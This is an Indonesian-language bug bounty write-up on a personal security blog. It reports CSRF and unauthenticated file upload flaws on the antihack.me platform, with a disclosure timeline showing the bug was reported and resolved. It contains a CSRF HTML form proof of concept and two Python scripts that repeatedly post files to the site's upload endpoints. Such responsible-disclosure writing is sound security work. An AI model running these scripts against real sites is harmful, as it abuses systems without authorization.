<!DOCTYPE html>
<html><head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="IT Security Enthusiast">
    <meta name="Author" content="Mas Zet">
    <meta name="keywords" content="Exploit | IT Security | Bug Bounty | HTB | Hacking | Pentest | Red Team">
    <link rel="stylesheet" href=https://zetc0de.github.io/css/syntax.css>
    <link rel="stylesheet" href=https://zetc0de.github.io/css/style.css>
    <script src="https://kit.fontawesome.com/1b7478c139.js" crossorigin="anonymous"></script>
    <title>zetc0de — IT Security Enthusiast</title>
  </head><body><aside id="sidenav">
    <header>
    
        <a href=https://zetc0de.github.io/><img src="https://zetc0de.github.io/avatar.png" alt="avatar"></a>
        
    

    <a id="branding" href=https://zetc0de.github.io/>
        
            zetc0de — IT Security Enthusiast
        
    </a>
    </header>

    <nav>
        
            		
            <a href="/"
                
            >
                <i class="fas fa-home fa-sm"></i>
                <span>Home</span>
            </a>
        
            		
            <a href="/post/"
                
            >
                <i class="fas fa-keyboard fa-ms"></i>
                <span>Articles</span>
            </a>
        
            		
            <a href="/tags"
                
            >
                <i class="fas fa-tags fa-ms"></i>
                <span>Tags</span>
            </a>
        
            		
            <a href="https://github.com/zetc0de"
                
                    target="_blank"
                
            >
                <i class="fab fa-github fa-ms"></i>
                <span>Github</span>
            </a>
        
            		
            <a href="/index.xml"
                
            >
                <i class="fas fa-rss fa-ms"></i>
                <span>RSS</span>
            </a>
        
    </nav>
</aside>
<main id="main">
            <a href="javascript:void(0)" id="closebtn" onclick="navToggle()"><i class="fas fa-bars fa-lg"></i></a>
            <div class="content">
    
    <h1 id="title">[Bug Bounty] Antihack.me CSRF File Upload Vulnerability</h1>
    
      
    <nav id="TableOfContents">
  <ul>
    <li>
      <ul>
        <li></li>
      </ul>
    </li>
  </ul>
</nav>
    <!-- raw HTML omitted -->
<h4 id="bcsfr-1-on-profile-image-file-uploadb"><!-- raw HTML omitted -->CSFR #1 On Profile Image File Upload<!-- raw HTML omitted --></h4>
<p>Antihack.me merupakan sebuah website Bug Bounty Platform asal singapura. Setelah mendaftarkan user baru dan login ke aplikasi, kita dapat mengatur profile kita sebagai bug hunter, termasuk juga setting avatar/photo profile. Tertarik dengan fitur upload imagenya, kita coba intercept request upload image tersebut.</p>
<!-- raw HTML omitted -->
<p>Terlihat disana beberapa parameter yang dikirimkan, akan tetapi disana tidak ada csrf protection, artinya siapapun dapat mengakses fitur upload ini, sekalipun dia tidak memepunyai akses ke akun manapun.</p>
<p>Lalu kami coba test request dengan html:</p>
<pre><code>&lt;!DOCTYPE html&gt;
&lt;html lang=&quot;en&quot;&gt;
&lt;head&gt;
	&lt;meta charset=&quot;UTF-8&quot;&gt;
	&lt;title&gt;CSRF File Upload&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
	&lt;form action=&quot;https://www.antihack.me/php/img_save_to_file_hacker.php&quot; method=&quot;POST&quot; name=&quot;csrf&quot; enctype=&quot;multipart/form-data&quot;&gt;
		&lt;input type=&quot;file&quot; name=&quot;img&quot;&gt;
		&lt;input name=&quot;HOST&quot; value=&quot;AntiHACK&quot;&gt;
		&lt;input type=&quot;submit&quot; value=&quot;Kirim&quot;&gt;
	&lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre><p>Lalu kami request dengan secript diatas dan didapatkan file berhasil diupload dengan baik.</p>
<!-- raw HTML omitted -->
<p>Lalu kami coba buat script csrf dengan python:</p>
<pre><code>#!/usr/bin/python3

import requests

headers = {
	'Origin':'www.antihack.me'
}
files = {
        'img': open(&quot;/home/zetc0de/Documents/antihack/antihack/csrf/security.png&quot;, 'rb') 
        }
data = {
	&quot;HOST&quot;:&quot;AntiHACK&quot;
}

for i in range(3):
	r = requests.post(&quot;https://www.antihack.me/php/img_save_to_file_hacker.php&quot;,files=files, headers=headers, data=data)
	print(r.text)
</code></pre><p>Ketika dieksekusi, file terupload dengan baik.</p>
<!-- raw HTML omitted -->
<h4 id="bcsrf-2-on-report-and-comment-file-uploadb"><!-- raw HTML omitted -->CSRF #2 On Report And Comment File Upload<!-- raw HTML omitted --></h4>
<p>Sepertihalnya platform bug bounty pada umumnya, disana terdapat fitur untuk melakukan reporting terkait celah keamanan yang ditemukan. Didalam fitur reporting tersebut terdapat beberapa fungsi editing, tak lupa fungsi upload file gambar/video juga disertakan guna kelengkapan report.</p>
<p>Dengan script python:</p>
<pre><code>#!/usr/bin/python3

import requests


files = {
        'files[]': open(&quot;/home/zetc0de/Documents/antihack/antihack/csrf/security.png&quot;, 'rb') 
        }

for i in range(5):
	r = requests.post(&quot;https://www.antihack.me/php/ajax_upload_file_company_new.php&quot;,files=files)
	print(r.text)


</code></pre><p>Didapatkan result sebagai berikut:</p>
<!-- raw HTML omitted -->
<pre><code>2018-12-28: Bug reported
2018-12-29: Triaged
2019-01-09: Report Resolved
2019-01-09: Swag Rewarded
</code></pre>
    
    <div class="nav-next-prev">
        <div class="nav-prev">
            
                <a href="https://zetc0de.github.io/post/2018-10-03-how-to-create-aws-docker-engine-with-docker-machine/"><i class="fas fa-chevron-left"></i></a>
            
        </div>
        <a class="nav-top" href="#">top</i></a>
        <div class="nav-next">
            
                <a href="https://zetc0de.github.io/post/2019-02-14-rce-and-xss-on-private-program-cyber-army/"><i class="fas fa-chevron-right"></i></a>
            
        </div>
    </div>
    

            </div><footer>
<div class="footer-content">

  <div class="contact-info">
      
          <div class="footer-mail">
          <i class="far fa-envelope"></i> <a href="mailto:zetc0de.id@gmail.com">zetc0de.id@gmail.com</a> </div>
      
      
      <div class="footer-phone">
          <i class="fas fa-phone"></i> <a href="https://t.me/zetc0de" target="_blank">Telegram</a> 
      </div>
      
  </div>


<p class="copyright meta">Copyright © 2008–2019, Steve Francia and the Hugo Authors; all rights reserved.</p>

</div>
</footer></main>
    </body>
    <script src=https://zetc0de.github.io/js/navbutton.js></script>
</html>
